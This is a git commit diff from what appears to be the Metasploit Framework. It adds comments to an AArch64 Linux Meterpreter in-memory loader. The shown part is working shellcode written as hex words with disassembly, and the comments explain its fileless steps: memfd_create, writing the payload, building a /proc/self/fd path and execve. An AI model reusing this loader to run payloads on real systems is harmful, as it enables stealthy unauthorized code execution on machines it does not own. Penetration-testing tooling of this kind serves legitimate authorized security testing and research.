1d68cfd65e4661428b9cb3e0ed0367dd831bc859
Martin Sutovsky <martin_sutovsky@rapid7.com>
2025-04-16 10:24:37 +0200

    Aarch64 comments

--- lib/msf/core/payload/linux/aarch64/meterpreter_loader.rb
+++ lib/msf/core/payload/linux/aarch64/meterpreter_loader.rb
@@ -7,20 +7,28 @@
 module Msf::Payload::Linux::Aarch64::MeterpreterLoader
   def in_memory_load(payload)
       in_memory_loader = [
+      
+      #memfd_create(null, MFD_CLOEXEC);
       0x0a0080d2, # 0x1000:	mov	x10, #0	0x0a0080d2
       0xea0300f9, # 0x1004:	str	x10, [sp]	0xea0300f9
       0xe0030091, # 0x1008:	mov	x0, sp	0xe0030091
       0x210080d2, # 0x100c:	mov	x1, #1	0x210080d2
       0xe82280d2, # 0x1010:	mov	x8, #0x117	0xe82280d2
       0x010000d4, # 0x1014:	svc	#0	0x010000d4
+
+      #use branching and branching with link to reliably get address of payload data
       0xe90300aa, # 0x1018:	mov	x9, x0	0xe90300aa
       0x1f000014, # 0x101c:	b	#0x1098	0x1f000014
       0xea031eaa, # 0x1020:	mov	x10, x30	0xea031eaa
+      
+      #write(fd,payload_addr, payload_size)
       0x420140b9, # 0x1024:	ldr	w2, [x10]	0x420140b9
       0x4a890091, # 0x1028:	add	x10, x10, #0x22	0x4a890091
       0xe1030aaa, # 0x102c:	mov	x1, x10	0xe1030aaa
       0x080880d2, # 0x1030:	mov	x8, #0x40	0x080880d2
       0x010000d4, # 0x1034:	svc	#0	0x010000d4
+      
+      #convert fd using itoa and append it to /proc/self/fd/ 
       0x4b0180d2, # 0x1038:	mov	x11, #0xa	0x4b0180d2
       0x4a0900d1, # 0x103c:	sub	x10, x10, #2	0x4a0900d1
       0x2c09cb9a, # 0x1040:	udiv	x12, x9, x11	0x2c09cb9a
@@ -40,6 +48,7 @@ module Msf::Payload::Linux::Aarch64::MeterpreterLoader
       0x4a0500d1, # 0x1078:	sub	x10, x10, #1	0x4a0500d1
       0xfaffff17, # 0x107c:	b	#0x1064	0xfaffff17
       0x4a3500d1, # 0x1080:	sub	x10, x10, #0xd	0x4a3500d1
+      #execve(/proc/self/fd/[fd],0,0)
       0xe0030aaa, # 0x1084:	mov	x0, x10	0xe0030aaa
       0x010080d2, # 0x1088:	mov	x1, #0	0x010080d2
       0x020080d2, # 0x108c:	mov	x2, #0	0x020080d2
